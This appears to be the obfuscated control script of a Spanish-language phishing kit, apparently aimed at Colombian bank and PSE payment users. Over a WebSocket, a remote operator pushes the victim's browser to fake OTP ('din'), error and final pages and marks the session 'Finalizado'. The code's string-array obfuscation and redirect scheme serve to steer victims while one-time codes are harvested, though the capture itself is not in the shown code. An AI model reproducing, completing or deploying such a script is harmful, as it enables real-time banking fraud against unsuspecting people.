function _0xa606(_0x44fa15, _0x3ea905) {
  const _0x5853fb = _0x5853();
  return (
    (_0xa606 = function (_0xa606e6, _0x2114ab) {
      _0xa606e6 = _0xa606e6 - 0x182;
      let _0x4f9e77 = _0x5853fb[_0xa606e6];
      return _0x4f9e77;
    }),
    _0xa606(_0x44fa15, _0x3ea905)
  );
}
const _0x456b70 = _0xa606;
(function (_0x514f71, _0x37940c) {
  const _0xd1ad82 = _0xa606,
    _0x1c23cc = _0x514f71();
  while (!![]) {
    try {
      const _0x301836 =
        -parseInt(_0xd1ad82(0x19a)) / 0x1 +
        parseInt(_0xd1ad82(0x190)) / 0x2 +
        (-parseInt(_0xd1ad82(0x197)) / 0x3) *
          (-parseInt(_0xd1ad82(0x1a7)) / 0x4) +
        (-parseInt(_0xd1ad82(0x194)) / 0x5) *
          (parseInt(_0xd1ad82(0x187)) / 0x6) +
        (-parseInt(_0xd1ad82(0x184)) / 0x7) *
          (-parseInt(_0xd1ad82(0x183)) / 0x8) +
        -parseInt(_0xd1ad82(0x1a6)) / 0x9 +
        parseInt(_0xd1ad82(0x185)) / 0xa;
      if (_0x301836 === _0x37940c) break;
      else _0x1c23cc["push"](_0x1c23cc["shift"]());
    } catch (_0x48125a) {
      _0x1c23cc["push"](_0x1c23cc["shift"]());
    }
  }
})(_0x5853, 0xdbc9b);
const dataLogId = localStorage[_0x456b70(0x198)]("dataLogId"),
  token = localStorage[_0x456b70(0x198)](_0x456b70(0x1a0));
function _0x5853() {
  const _0x1eee75 = [
    "Hubo\x20un\x20error\x20al\x20cargar\x20los\x20datos.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "log",
    "dataLogToken",
    "valor",
    "Datos\x20recibidos:",
    "Hubo\x20un\x20error\x20al\x20actualizar\x20el\x20estado.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "connect_error",
    "data",
    "5576544sSeQuE",
    "10084FPcvbg",
    "Error\x20en\x20el\x20PUT\x20a\x20updateEndDataLog",
    "6559664TONTrS",
    "14AfEfuq",
    "10062400nRtETb",
    "location",
    "30BgoomX",
    "connect",
    "./error.html",
    "href",
    "application/json",
    "valid",
    "/dataLogs/updateEndDataLog/",
    "./index.error.html",
    "./otp.html",
    "518402IHLuIr",
    "message",
    "end",
    "PUT",
    "2215bkuKzO",
    "error",
    "ID\x20de\x20dataLog:",
    "3dZRToh",
    "getItem",
    "./otp.error.html",
    "1385796LyMPBa",
    "Error\x20al\x20actualizar\x20el\x20estado:",
    "stringify",
    "./errorPse.html",
  ];
  _0x5853 = function () {
    return _0x1eee75;
  };
  return _0x5853();
}
(!dataLogId || !token) &&
  (console["error"](
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage."
  ),
  alert(_0x456b70(0x19e)),
  (window[_0x456b70(0x186)]["href"] = _0x456b70(0x189)));
const socket = io(url, { query: { token: token } });
socket["on"](_0x456b70(0x188), () =>
  console["log"]("Conectado\x20al\x20WebSocket")
),
  socket["on"](_0x456b70(0x1a4), (_0x585d57) =>
    console[_0x456b70(0x195)](
      "Error\x20de\x20conexión:",
      _0x585d57[_0x456b70(0x191)]
    )
  ),
  socket["on"](_0x456b70(0x1a5), async (_0x1c07fd) => {
    const _0xbb400a = _0x456b70;
    console[_0xbb400a(0x19f)](_0xbb400a(0x1a2), _0x1c07fd),
      console[_0xbb400a(0x19f)](_0xbb400a(0x196), dataLogId);
    if (String(_0x1c07fd[_0xbb400a(0x18c)]) !== String(dataLogId)) return;
    const _0xcdd358 = {
      us: _0xbb400a(0x18e),
      din: _0xbb400a(0x18f),
      new_din: _0xbb400a(0x199),
      end: _0xbb400a(0x19d),
    };
    if (_0x1c07fd[_0xbb400a(0x1a1)] in _0xcdd358) {
      if (_0x1c07fd[_0xbb400a(0x1a1)] === _0xbb400a(0x192))
        try {
          await updateStatus();
        } catch (_0x3e309c) {
          console[_0xbb400a(0x195)](_0xbb400a(0x19b), _0x3e309c),
            alert(_0xbb400a(0x1a3));
          return;
        }
      window["location"][_0xbb400a(0x18a)] =
        _0xcdd358[_0x1c07fd[_0xbb400a(0x1a1)]];
    }
  });
async function updateStatus() {
  const _0x360a5e = _0x456b70;
  try {
    const _0x5de8f9 = await fetch(url + _0x360a5e(0x18d) + dataLogId, {
      method: _0x360a5e(0x193),
      headers: {
        "Content-Type": _0x360a5e(0x18b),
        Authorization: "Bearer\x20" + token,
        Origin: window[_0x360a5e(0x186)]["origin"],
      },
      body: JSON[_0x360a5e(0x19c)]({ status: "Finalizado" }),
    });
    if (!_0x5de8f9["ok"]) {
      const _0x25e7f9 = await _0x5de8f9["json"]();
      throw new Error(_0x25e7f9[_0x360a5e(0x195)] || _0x360a5e(0x182));
    }
    console[_0x360a5e(0x19f)](
      "Estado\x20actualizado\x20correctamente\x20en\x20el\x20servidor."
    );
  } catch (_0x4a4421) {
    throw _0x4a4421;
  }
}
